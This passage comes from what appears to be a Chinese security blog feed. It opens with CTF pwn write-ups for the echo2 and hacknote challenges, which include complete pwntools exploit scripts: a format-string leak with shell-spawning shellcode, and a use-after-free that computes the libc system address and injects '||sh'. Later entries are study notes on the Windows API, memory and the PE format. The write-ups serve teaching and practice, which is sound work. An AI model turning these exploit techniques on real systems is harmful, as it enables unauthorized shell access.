alt="image-20230620155817628"></p><p>free（s）清空了内存但指针未销毁但随着echo3执行完毕对应s栈帧销毁故无影响 但 cleanup（）函数free（0）对应uaf 即o内存被清空但指针未被销毁 此时再用另一指针与o指向同一内存空间即可获取主动权</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">吗 </p><p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p><p>echo3free后s使用的空间最后还是留在对应得4字长chunk中  o最后一个参数写入shellcode（greeting） 首地址作为参数进行传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span> <span class="comment">#A用作标记</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>hacknote（32位）</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p><p>​                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>add函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p><p>框住部分掌握控制信息 size对应的chunk可由用户自定义（uaf）control上未puts 下为sub</p><p>delete函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p><p>由下自上free两个chunk 但指针未被销毁 双free（uaf）<br>攻击第一步：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p><p>malloc两次（写入垃圾数据的chunk+管理控制信息的chunk）</p><p>第二步<br>delete两个chunk 相同大小chunk进入同一fast bin self_puts第一个字长变为fd的第一个其他未变（包括指针）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p><p>malloc两次hou后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p><p>传参用self_puts 地址  sub_chunk写入—&gt;puts_got<br>泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p><p>print（0）对接远程的puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p><p>0此时保存的函数地址 获取0的地址进而利用两个chunk块<br>0中第一部分传入system地址（无可避免）用||（或）sh【前一条语句执行失败则执行sh】妙哉<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = remote(&quot;chall.pwnable.tw&quot;,10102)</span></span><br><span class="line">p=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size,index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;size :&quot;</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="string">b&quot;||sh&quot;</span>)</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解密系列basic</title>
      <link href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"/>
      <url>/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/</url>
      
        <content type="html"><![CDATA[<p><em>解密系列[基础篇]</em></p><h3 id="多字节存储顺序"><a href="#多字节存储顺序" class="headerlink" title="多字节存储顺序"></a><strong>多字节存储顺序</strong></h3><p>两种编码区别:<br>**Big-Endian:**高位字节存入低地址，低位字节存入高地址，依次排列。<br>**Little-Endian :**低位字节存入低地址，高位字节存入高地址，反序排列         多字节数据存放顺序与CPU有关。</p><p>微处理器中存放顺序有正序（ Big-Endian）和逆序(Little-Endian） (也称大端存储和小端存储)之分。<br>常见的Intel系列使用的编码方式属于Little-Endian类；某些RISC架构的CPU·OIBM6Power-PC等属于Big-Endian类。</p><p>补充：ASCII （ American Standard Code for InformationInterchange·美国信息互换标准代码) 0-256。<br>Unicode字符编码的编码范围是︰0-65535·它包含三套编码方式如 :UTF-8·UTF-16和UTF-32·它和ASCII的关系为ASCII字符编码是Unicode字符编码的一部分。</p><h3 id="Win-API简介"><a href="#Win-API简介" class="headerlink" title="Win API简介:"></a><strong>Win API简介:</strong></h3><p>Windows API就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 7 ·Windows Vista - WindowsXP -Windows Server 2003 ·Windows 2000-Windows95 ·Windows 98-Windows Me (Millennium Editon）和OWindows CE等几乎所有版本。它被设计为各种语言的程序调用，也是应用软件与Windows系统最直培的交互方式。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/IZFRQK66[MK~]3S%7D62$Y4KJ.png" alt="img"></p><p><strong>动态链接库</strong>︰动态链接就是把一些经常会共用的代码（静态链培的OBJ程序库）制作成DLL文件。当可执行文件调用到DLL文件内的函数时windows操作系统才会把DLL文件加载存储器内。<br>DLL文件本身的结构就是执i行文件（PE） ,当程序需求函数才进行链接，通过动态链接方式，存储器浪费的情形将大幅降低。                           <strong>kernel32.dll</strong>:控制着系统的内存管理﹑数据的输入输出操作和中断处理。当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。<br><strong>user32.dll</strong>: Windows用户界面相关应用程序接口，用于包括Windows处理、基本用户界面等特性。如创建窗口和发送消息。<br><strong>gdi32.dll</strong>:是Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字。   </p><p><strong>句柄</strong>：是整个windows编程的基础。<u>一个句柄是指使用的一个唯一的整数值</u><u>，用于标志应用程序中的不同对象和同类对象中的不同的实例</u>。<br>例：一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。应用程序能够通过句柄访问相应的对象的信息。<br>句柄是windows用来标志应用程序中建立的或是使用的唯一整数windows使用了大量的句柄来标志很多对象。</p><p>HWnd：带文本的窗口或控件的句柄。<br>IpString：指向接收文本的缓冲区的指针。<br>nMaxCount：指定要保存在缓冲区内的字符的最大个数，其中包含NULL字符      </p><h3 id="HWND-GetDlgItem函数"><a href="#HWND-GetDlgItem函数" class="headerlink" title="HWND GetDlgItem函数"></a><strong>HWND GetDlgItem函数</strong></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hwndScroll</span> = GetDlgItem(hwnd, IDC_SCROLL)<span class="comment">;       </span></span><br></pre></td></tr></table></figure><p> 假设一个父窗口中有多个子窗口，那么本函数是返回一个子窗口句柄。第一个参数：父窗口句柄     第二个参数：子窗口    UINT </p><h3 id="IDUINT-GetDlgItemText函数"><a href="#IDUINT-GetDlgItemText函数" class="headerlink" title="IDUINT GetDlgItemText函数"></a><strong>IDUINT GetDlgItemText函数</strong></h3><p>​<br>（检索与对话框中的控件关联的标题或文本）                                                                                 </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GetDlgItemText(</span><br><span class="line">  <span class="keyword">HWND</span> hDlg,       <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="keyword">int</span> nIDDlgItem,  <span class="comment">// control identifier</span></span><br><span class="line">  LPTSTR lpString, <span class="comment">// pointer to buffer for text</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount    <span class="comment">// maximumsize of string</span></span><br><span class="line">)<span class="comment">;                                      </span></span><br></pre></td></tr></table></figure><h3 id="GetwindowText函数"><a href="#GetwindowText函数" class="headerlink" title="GetwindowText函数"></a><strong>GetwindowText函数</strong></h3><p>将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。             如果指定的窗口是一个控件，则拷贝控件的文本。                <u>GetWindowText不能接收在其他应用程序中的控件的文本。</u></p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> GetWindowText(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,        <span class="comment">// handle to window or control</span></span><br><span class="line">  LPTSTR lpString,  <span class="comment">// text buffer</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount     <span class="comment">// maximum number of characters to copy</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="UINT-GetDlgItemInt函数"><a href="#UINT-GetDlgItemInt函数" class="headerlink" title="UINT GetDlgItemInt函数"></a><strong>UINT GetDlgItemInt函数</strong></h3><p>（将对话框中指定控件的文本转换为整数值）                                                     </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UINT</span> GetDlgItemInt(</span><br><span class="line">  HWND hDlg,           <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="type">int</span> nIDDlgItem,      <span class="comment">// control identifier</span></span><br><span class="line">  <span class="type">BOOL</span> *lpTranslated,  <span class="comment">// success state</span></span><br><span class="line">  <span class="type">BOOL</span> bSigned         <span class="comment">// signed or unsigned value</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><p>（这个API方法用来创建、显示、操作一个消息框。它包含可设置的消息内容、标题，还可以添加预定义的图标、放置按钮）int </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> MessageBox(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,          <span class="comment">// handle to owner window</span></span><br><span class="line">  LPCTSTR lpText,     <span class="comment">// text in message box</span></span><br><span class="line">  LPCTSTR lpCaption,  <span class="comment">// message box title</span></span><br><span class="line">  UINT uType          <span class="comment">// message box style</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>NT架构从内核到KERNEL32·USER32·GDI32都是纯32位实现。<br>NT架构标准字符集重头开发，统一使用Unicode字符集·兼容ASCII字符集。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/R~%60]HZH%7BDN_P3NYJL1V@MSF.png" alt="img"></p><p>区别：1.函数调用完后谁来清空栈2.入栈顺序（两者均自右向左）stdcall由子程序平衡栈 cdel（c语言标准）由调用值平衡栈回调函数。（callback）回调函数</p><p><img src="D:\Users\lenovo\Desktop\5.png"></p><p><img src="D:\Users\lenovo\Desktop\4.png"></p><p>Windows操作系统最大的特点就是其图形化的操作只面和多任务的管理。这些强大功能就是建立在其消息处理机制这个基础之上的。Windows系统与应用程序之间，应用程序与应用程序之间的通讯就是通过消息来触发，并靠对消息的响应和处理来完成。<br>Windows系统中有两种消息队列:一种是<strong>系统消息队列</strong>，另一种是<strong>应用程序消息队列</strong>。Windows本身是由消息驱动，当调试程序时跟踪一个消息会得到相当底层的答案。                                                                        Windows为当前执行的每个Windows程序维护一个消息队列。<u>在发生某事件之后，系统将该事件转换为一个消息，并将消息投放入程序消息队列中。</u>程序通过i行一块称之为消息循环的程序代码从消息队列中取出消息!其实∶<strong>消息不过是定义一个结构。定义一堆ID，在程序运行过程中调用switch case拦截去完成巳应的功能。</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">while</span>(GetMessage (&amp;msg, NULL,<span class="number">0</span>,<span class="number">0</span>))                               &#123;TranslateMessage (&amp;msg);<span class="comment">//翻译消息</span></span><br><span class="line">DispatchMessage (&amp;msg); &#125;<span class="comment">//分配消总</span></span><br></pre></td></tr></table></figure><p><strong>SendMessage函数</strong>                                                                                将指定的消息发送到一个或多个窗口。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT [SendMessage]（<span class="keyword">HWND</span> <span class="keyword">hWnd</span>，UINT Msg，<span class="keyword">WPARAM</span> <span class="keyword">wParam</span>，<span class="keyword">LPARAM</span> <span class="keyword">IParam</span>）；</span><br></pre></td></tr></table></figure><h3 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a><strong>WM_COMMAND</strong></h3><p>产生的条件：点击<strong>菜单</strong>， 点击<strong>加速键</strong>（键盘快捷键，是一个或几个按键的组合，它用于激活特定的命令，使用加速键不需要费力移动鼠标就能激活菜单项），点击窗口<strong>按钮</strong>，点击<strong>工具栏按钮</strong>。这些时候都有command消息产生。<br> wParam 高两个字节 通知码<br>wParam 低两字节 命令ID<br>lParam 发送命令消息的子窗体句柄。<br> <strong>WM_GETTEXT</strong><br> <strong>WM_QUIT</strong><br><strong>WM_LBUTTONDOWN</strong><br><strong>WM_RBUTTONUP</strong><br><strong>WM_KEYUP</strong><br>（可自行查询相应用法及作用 我也是大懒虫捏【😀】）</p><h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a><strong>实模式</strong></h3><p>程序指令在执行过程中一般需要有各种数据,x86系列CS、DS、ES、FS、SS等用于指示不同用涂的数据段在内存中的位置。<br>x86系列使用中断机制来实现系统服务。<br>寄存器的扩展之路∶<br>8086以前（ 8bit） -&gt;8086（ 16bit） -&gt;80386(32bit)-&gt;现在的64bitCPU</p><p>寄存器（AL) -&gt;(AX)-&gt;（EAX）-&gt;(RAX)                                                         </p><h3 id="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"><a href="#保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。" class="headerlink" title="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"></a><strong>保护模式</strong>∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。</h3><p>和实模式下一样，保护模式下程序运行的实质仍是“CPU执行指令，操作相关数据”。主要改变的是寻址的方式，保护模式在寻址方式上“动了手脚””，为的是起到“保护作用”。</p><p><strong>保护模式</strong><br><u>一.不同任务之间的保护∶</u><br>通过把每个不同的任务放在不同的虚排地址空间中﹐来实现不同任务之间的隔离（即A程序不能访问和修改B程序的代码和数据）·以达到程序间的隔离;<br><u>二.同一任务的保护∶</u><br>在每一任务之内定义了4种保护级别·方别为0，1，2，3按环的方式表示.</p><p><img src="D:\Users\lenovo\Desktop\3.jpg"></p><p>其中，0级代表最高的权限级别，3级代表最低权限级别。按环的方式来表示。其中，环0、1、2为系统级，环3为用户级。<br>一般的系统只能使用环0和环3两个级别。                                             如上图所示，最外层的CodeAP1只能访问DataAP1。不能访问同级的另一应用程序的DataAP2;同样·CodeAP2只能访i6DataAP2 不能访DataAP1 。                                                                                            要说明的是：<strong>如果应用程序拥有第0级的权限，那么它就可以执行所有的指令并访问所有的数据。</strong><br>如果应用程序拥有的权限级别是第3级，它执行的指令是有限的，能访问的数据也是有限的（被保护)  。                                                                           操作系统的核心层是运行在Ring 0级。<br>WIN32子系统（KEDNET32.DLL 【内存的管理】USER32.DLL【操作用户的界面】 ，GDI32.DLL【操作图像的界面】等）是运行在Ring3级的，以提供与子程序的接口。</p><h3 id="虚拟内存（确实存在于硬盘中）∶"><a href="#虚拟内存（确实存在于硬盘中）∶" class="headerlink" title="虚拟内存（确实存在于硬盘中）∶"></a><strong>虚拟内存（</strong>确实存在于硬盘中）∶</h3><p>虚拟内存并不是真正的内存·它是通过射( Map）的方法﹐使用的虚拟地址（VA)达到4GB（因为EIP32位索引的最大范围是4GB）。<br>这样规定︰每个应用程序可以被分配到2GB的虚拟地址·剩下的2GB留给操作系统自己用。( Windows NT中·应用程序甚至有3GB为虚拟地址 )    </p><p>Windows是一个分时的多任务操作系统·CPU的时间被分割成一个个的时间片后行配给名个不同的应用程序·在一个时间片里，和这个应用程序护行无关的东西并不会又映射到线性地址中（这样EIP就索引不到）。</p><p>因比可以做到每个程序都拥有自己独立的4GB寻址空间·互不干扰。</p><p>要说明的是DLL与EXE不同【dll文件无自己的私有空间(动态链接文件）】</p><h4 id="简单的虚拟内存的实现方法和过程∶"><a href="#简单的虚拟内存的实现方法和过程∶" class="headerlink" title="简单的虚拟内存的实现方法和过程∶"></a><strong>简单的虚拟内存的实现方法和过程∶</strong></h4><p>1.当一个应用程序被启动时，操作系统创建一个新的进程，并给这个进程行配2GB的虚拟地址（不是内存哦 是地址)。<br>2.虚拟内存管理器将应用程序的代码射到哪个程序的虚拟地址中的某个位置，并把当前所需要的代码读取到内存物理地址中。<br>3.如果用动态链接库DLL，DLL程序也会被映射到进程的虚拟地址空i间在需要的时候才被读入物理内存。<br>4.其他项目(像数据﹑堆栈等)的空间是首先从物理内存中行配，再反向映射到虚拟地址空间中的。<br>5.应用程序通过使用的他的虚拟地址空间中的地址开始执行·然后由虚拟内存管理器把每次的内存访问映射到物理位置去。</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>一.应用程序是不会直接访i问物理地址的。<br>二.虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问；<br>三.每个程序都有独立的4G寻址空间·不同程虚拟地址空间是被互相隔离的;                                                                                                          四.DLL程序没有巨己的“私有”空间·它们称之为动态链接库文件·它们总是被射到其他应用程序的地址空间中的﹐作为其他应用程序的一部行运行。<br>最后，使用虚拟内存的好处是︰简化了内存的管理，并弥补物理内存的不足。另外以防止多任务环境下各个应用程序之间的冲突!</p><h3 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a><strong>PE文件</strong></h3><p>PE的意思就是Portable Executable （可移植的挖行体)。它是Windows环境身所带的e行体文件格式。<br>它的一些特性继承由Unix Coff (commonobject file format)文件格式。<br>“portable executable”（己移植的执行体）意味着此文件格式是跨win32平台的:也就是说即使Windows 运行在非IntelCPU 上·任意win32平台的PE装载器都能识别和使用该文件格式。</p><p>基本上所有win32执行体(除了VxD和16位的DI)都用PE文件格式，包括NT的内核模式驱动程序( kernel mode drivers ) 。因而研究PE文件格式给了我们洞悉 Windows结构的良机。<br>PE文件用的是一个平面地址空间·所有代码和数据都合并在一起·组成一个很大结构文件的内容被行割为不同的区块（Section又称为区段·节等)·块中包含代码或数据。</p><p>每个区块都有巨己在内存中的属性：可读&#x2F;写·只读等。<br>每个区块都有不同的名字，这用名字主要用来表示区块功能。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230131171812728.png" alt="image-20230131171812728"></p><p>PE文件非常好的一个地方就是在磁盘上的数据结构与在内存中的结构是一致的。<br>当至统装载一个己i行文件到内存中·主要就是将一个PE文件的某一部方映射到地址空间中·这样﹐PE文件的数据结沟在磁盘和内存中就是一样的了。</p><p><img src="D:\Users\lenovo\Desktop\1.png"></p><p>(1）入口点（Entry Point）<br>PE文件巳行时的入口点（Entry Point) 。也就是说·程序在执行时的第一行代码地址应该就是这个值·有点像8086汇编语言中end start中start指向的入口地址。<br>(2）文件偏移地址（File Offset）<br>当PE文件储存在磁盘上的时候·各数据的地址称作文件的移地址·文件偏移地址人PE文件的第一个字节开始计数·起始值为0。</p><h3 id="虚地地址-Virtual-Address-VA"><a href="#虚地地址-Virtual-Address-VA" class="headerlink" title="虚地地址(Virtual Address, VA)"></a><strong>虚地地址(Virtual Address, VA)</strong></h3><p>由于Windows程序运行在保护模式下·所以应用程序访问存储器所使用的逻辑地址称为虚拟地址（因为他不是真正的物理地址·真正的物理地址被windows妈妈的保护机制保护起来)﹐又称为内存偏移地址（Memory Offset) 。实地址模式下的“段址也写地址∶偏移地址索引方式类似·虚樽地;成“段∶偏移量”的形式·但不同之处在于这里的段不再是段地切而是指段选择子。<br>例t :”0123:004010003’<br>0123∶表示段选择子。其数据存储在CS段选择器里。同一程序在不同系统环境下此值可能不同，因比我们不需要关心。<br>00401000∶此处表示内存中的虚拟地址。一般来说，同一个程序的向一条指令在不同系统环境下，此值相同（PE映射原理）。</p><h3 id="基地址（-ImageBase"><a href="#基地址（-ImageBase" class="headerlink" title="基地址（ ImageBase)"></a><strong>基地址（ ImageBase)</strong></h3><p>文件执行时将被映射到指定内存地址中·这个初始内存地址称为基地址。这个值是由PE文件本身设定的。<br>控照默认设置·用Visual C++建立的EXE文件基地址是00400000h。DLL支件基地址是10000000h。但这个值可自己在编译器设定的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>荒诞</title>
      <link href="/2023/08/27/%E8%8D%92%E8%AF%9E/"/>
      <url>/2023/08/27/%E8%8D%92%E8%AF%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="yub‘s-blog"><a href="#yub‘s-blog" class="headerlink" title="yub‘s blog"></a>yub‘s blog</h2><p>向着彩虹海出发！</p><p><img src="/../imgs/1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hot Time Exercising Records</title>
      <link href="/2022/11/08/Hot%20Time%20Exercising%20Records/"/>
      <url>/2022/11/08/Hot%20Time%20Exercising%20Records/</url>
      
        <content type="html"><![CDATA[<h1 id="Hot-Time-Exercising-Records"><a href="#Hot-Time-Exercising-Records" class="headerlink" title="Hot Time Exercising Records"></a>Hot Time Exercising Records</h1><h4 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h4><p>系统调用号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">section 